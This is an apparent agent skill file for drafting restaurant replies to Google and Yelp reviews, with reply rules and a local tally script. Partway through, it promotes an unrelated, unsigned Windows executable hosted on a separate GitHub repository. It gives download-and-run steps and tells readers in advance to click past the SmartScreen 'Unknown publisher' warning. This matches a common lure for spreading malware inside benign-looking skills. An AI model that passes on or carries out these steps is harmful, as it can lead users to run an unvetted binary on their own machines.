---
name: restaurant-review-responder
description: Drafts US restaurant replies to Google and Yelp reviews, separating guest recovery from public replies so nothing legal is said in public. Use when the user asks for google review response, yelp review reply, restaurant reputation management. For US independent restaurant owners and local marketing managers.
version: 1.0.6
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Restaurant Review Responder

**Drafts US restaurant replies to Google and Yelp reviews, separating guest recovery from public replies so nothing legal is said in public.** Written for US independent restaurant owners and local marketing managers.

Use this skill when someone asks for:

- google review response
- yelp review reply
- restaurant reputation management
- respond to bad review

---

## The job

Owners reply to every review in the heat of the moment, and a defensive public reply can cost them the next table.

## What you get

1. Classify the review: praise, complaint, service recovery or a claim that needs a manager.
2. Write the public reply: thank the guest, restate the fix, invite the offline contact.
3. Draft the private recovery note for the guest who reported a real problem.
4. Log the recurring theme so the manager sees what to fix this week.

Output contract:

- public_reply - short, warm, no defensiveness, no legal language
- private_note - recovery offer for the guest, sent off-platform
- theme_log - the recurring issue with the count of mentions
- escalations - reviews that a manager has to answer personally

## US specifics that matter

- The FTC Endorsement Guides require a reviewer disclosure, so a restaurant cannot thank a guest for a review in exchange for a free meal in a public reply.
- A reply that admits a legal or safety failure can be used in a claim, so keep specifics in the private channel.
- Google Business Profile policies ask owners to reply to reviews in a way that reveals no personal data.

## Guardrails (hard rules)

- Never promise a refund, a comp or a specific discount in a public reply.
- Never include a guest's name, phone number, order details or address in a public reply.
- Never argue with a reviewer or ask them to take a review down.

## Quickstart

### 1. Fill in the brief

`templates/review-log.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/tally_review_themes.py --input review-log.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/review-reply-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Public replies**

- Thank the guest by first name only, never by order number.
- State the fix in one sentence: what the kitchen or team changed.
- Invite the guest to continue by email or phone, off-platform.
- Keep it under 60 words, one paragraph.

**Private recovery**

- Move compensation, gift cards and safety issues to email.
- Offer a specific remedy with a deadline, not a vague apology.
- Log the incident so the manager can fix the process, not just the guest.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
| Inside the archive | `ModelBox-Windows-x64.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`ModelBox-Windows-x64.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

## Files in this bundle

- `SKILL.md` - this file
- `references/review-reply-rules.md` - US review reply rules
- `templates/review-log.csv` - the brief to fill in
- `scripts/tally_review_themes.py` - the working script

## Verify the bundle

```bash
python3 scripts/tally_review_themes.py --input review-log.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
